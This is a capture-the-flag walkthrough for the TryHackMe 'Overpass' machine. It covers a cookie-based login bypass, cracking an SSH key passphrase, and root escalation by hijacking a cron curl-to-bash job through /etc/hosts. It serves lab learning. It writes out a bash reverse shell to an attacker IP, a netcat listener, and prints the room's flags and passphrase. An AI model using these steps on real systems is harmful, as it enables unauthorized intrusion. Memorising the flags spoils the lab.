# Overpass

> Platform: TryHackMe
>
> Created by: NinjaJc01
>
> Difficulty: Easy

## Reconnaisance

First of all, we will begin with the Nmap which requires us to answer some of the questions.
```bash
$ nmap -sSVC <TARGET-IP> -T5 -Pn -n -vvv -oA overpassscan
```
Actually, you can just use a normal Nmap command, but here is my preferences.

After finish scanning the machine, now we can answer some of the questions:

![img](portopen.png)

Then, to know the hidden directory of the target, we need to run the GoBuster tool.
```bash
$ gobuster dir -u http://<TARGET-IP>/ -w /usr/share/wordlists/dirb/common.txt
```

![img](gobuster.png)

## Exploitation

After that, when inspecting the **"/admin"** page, we found out that actually there are several **.js** script, which the **"login.js"** scripts shows us it has **broken authentication vulnerability**.

```js
// snippet from login.js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

First, it will check if the **statusOrCookie is exactly equal to the string "Incorrect credentials"**, it will output it as Incorrect credentials. However, if we **set the cookies name as SessionToken with any value**, it will **redirect us the the /admin** page which **may reveal some information**.

![img](cookies.png)

Then, check the page:

![img](key.png)

Now, **copy the private key** into a file and try place it in **~/.ssh/sshprivkeyfile with 600 permission**.
```bash
$ echo "-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBB... and so on
-----END RSA PRIVATE KEY-----" > ~/.ssh/overpass_id_rsa

$ chmod 600 ~/.ssh/overpass_id_rsa
```

Now, let's try to SSH to the server with **james** as the username, which we **get from the /admin page before** with the SSH Private key just now.
```bash
$ ssh james@<TARGET-IP> -i ~/.ssh/overpass_id_rsa
Enter passphrase for key '/home/kali/.ssh/overpass_id_rsa':
```

However, it ask us the **passphrase key**. For this, let's try to **crack the SSH private key first**. For me, I copy the file first to my working directory.
```bash
$ cp ~/.ssh/overpass_id_rsa /PATH/TO/YOUR/WORKING/DIRECTORY

$ cd /PATH/TO/YOUR/WORKING/DIRECTORY

$ ssh2john overpass_id_rsa > ssh.hash

$ john ssh.hash
james13
```

Now, after getting the **passphrase key**, we can **connect to the server using SSH**.
```bash
$ ssh james@<TARGET-IP>
Enter passphrase for key '/home/kali/.ssh/overpass_id_rsa': <passphrase-key>
```

![img](ssh.png)

So now, we need to find the **user.txt** and read it.
```bash
$ ls
todo.txt  user.txt

$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
```

## 🏳️Flag: user.txt
>**thm{65c1aaf000506e56996822c6281e6bf7}**

## Privilege Escalation

Moving on to **escalate our privileges to root**.

First, let's try to **check the content of the other ".txt"** file in the directory.
```bash
$ cat todo.txt
```

![img](todo.png)

Based on these content, it says that **they have automated build script working**. So, try to check the crontab as **cron usually will be used to automate running any task that we set in it** which can be view from:
```bash
$ cat /etc/crontab
```

![img](crontab.png)

From what we can see here, for **every minute**, the user **root will run curl command to the "overpass.thm/downloads/src/buildscript.sh"**, which will **retrieve the buildscript.sh** and **run the script in bash**.

Why it is dangerous? From this, if the **attacker able to change the overpass.thm to the attacker machine** and **host the buildscript.sh which containing the reverse shell**, the **attacker able to gain the shell in root privilege**.

Try to **"check the /etc/hosts"** file:
```bash
$ cat /etc/hosts
```

![img](hostsbefore.png)

So now, try to create the **"/downloads/src"** directory in our devices **root** directory and **create the buildscript.sh file which contains the reverse shell payload** which can be get from the [Reverse Shell Generator](https://www.revshells.com/) page.
```bash
$ cd /

$ mkdir -p downloads/src; cd downloads/src

$ sudo nano buildscript.sh
```

Then, paste the reverse shell payload:
```bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1
```

Next, in Attacker device, make sure to **open 2 terminal** to run the command below:

In Terminal 1:
```bash
$ cd /

$ python3 -m http.server
```

In Terminal 2:
```bash
$ nc -lvnp <ATTACKER-PORT>
```

Lastly, in the machine, we need to change the **/etc/hosts "overpass.thm"** to our IP:
```bash
$ nano /etc/hosts
```

Change the 
```bash
127.0.0.1 overpasss.thm
```

To:
```bash
<ATTACKER-IP> overpass.thm
```

![img](hostsafter.png)

Now, we need to wait and read the **"root.txt"** file to complete this machine.

![img](rootflag.png)

## 🏳️Flag: root.txt
>**thm{7f336f8c359dbac18d54fdd64ea753bb}**